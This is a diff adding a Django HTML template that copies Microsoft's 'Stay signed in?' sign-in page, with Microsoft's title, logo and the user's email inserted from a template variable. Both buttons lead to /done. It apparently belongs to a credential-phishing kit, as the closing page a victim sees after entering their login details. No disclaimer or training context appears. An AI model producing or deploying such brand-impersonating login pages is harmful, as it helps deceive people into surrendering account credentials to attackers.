@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    {% load static %}
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="{% static 'favicon.ico' %}" />
+    <title>Sign in to your Microsoft account</title>
+    <link rel="stylesheet" href="{% static 'app.css' %}" />
+</head>
+
+<body>
+    <section id="section_final">
+        <div class="auth-wrapper">
+            <img src="{% static 'logo.png' %}" alt="Microsoft" class="d-block" />
+            <div class="identity w-100 mt-16 mb-16">
+                <span id="user_identity">{{email}}</span>
+            </div>
+            <h2 class="title mb-16">Stay signed in?</h2>
+            <p class="p">Stay signed in so you don't have to sign in again next time.</p>
+            <label class="has-checkbox">
+                <input type="checkbox" class="checkbox" />
+                <span>Don't show this again</span>
+            </label>
+            <div class="btn-group">
+                <a href="/done" class="btn btn-sec" id="btn_final">No</a>
+                <a href="/done" class="btn" id="btn_final">Yes</a>
+            </div>
+        </div>
+    </section>
+</body>
+
+</html>
